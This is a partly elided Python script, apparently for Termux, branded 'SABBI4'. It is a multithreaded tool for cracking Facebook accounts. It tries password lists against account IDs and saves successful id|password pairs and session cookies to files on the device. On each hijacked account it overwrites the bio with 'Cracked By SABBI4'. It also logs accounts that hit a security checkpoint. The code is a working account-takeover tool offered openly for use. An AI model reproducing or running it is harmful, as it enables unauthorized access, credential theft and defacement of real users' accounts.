...
\033[1;97m═════════════════════════════════════════════
[\033[1;92m⭕\033[1;97m]OWNER          \033[1;91m: \033[1;97mSABBIR ISLAM
[\033[1;92m⭕\033[1;97m]TOOL           \033[1;91m: \033[1;97mFILE-CLONEING
[\033[1;92m⭕\033[1;97m]STATUS         \033[1;91m: \033[1;97mFREE
[\033[1;92m⭕\033[1;97m]NETWORK        \033[1;31m: \033[1;97m3G\033[97;1m,4G,5G
[\033[1;92m⭕\033[1;97m]VERSION        \033[1;91m: \033[38;5;208m3.0.0
\033[1;97m═════════════════════════════════════════════ """)
def linex():
        print('\x1b[91m══════════════════════════════════════════════')
class jalan:
...
def File():
	...
	with ThreadPool(max_workers=40) as pool:
		...
		print ("[\033[1;92m•\033[1;97m]Total Account:\x1b[32m"+total_ids)
	...
	print(' \033[1;92m[✔] Saved In SABBI4-OK.txt,SABBI4-CP.txt')
	linex()
oks=[]
...
def crack1(idf,pwv):
	...
	#sys.stdout.write(f"\r [SABBI4] {loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	#sys.stdout.flush()
	sys.stdout.write('\r\033[1;37m [SABBI4] %s|\033[1;32mOK:-%s\033[1;37m\r'%(loop,len(oks)));sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				print (' \x1b[1;92m[SABBI4-OK] '+idf+'|'+pw)
				open('/sdcard/SABBI4-OK.txt','a').write(idf+'|'+pw+'\n')
				try:
					pi = ses.get('https://m.facebook.com/').text
					cookies=ses.cookies.get_dict()
					data ={"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(pi)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(pi)).group(1), 'bio':"Cracked By SABBI4 (SABBI4 TERMUX ZONE')"}
				...
				open('/sdcard/SABBI4-KOKI.txt','a').write(cokii+'\n')
				
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print (f' \x1b[38;5;208m[SABBI4-CP] '+idf+'|'+pw)
				open('/sdcard/SABBI4-CP.txt','a').write(idf+'|'+pw+'\n')
				break
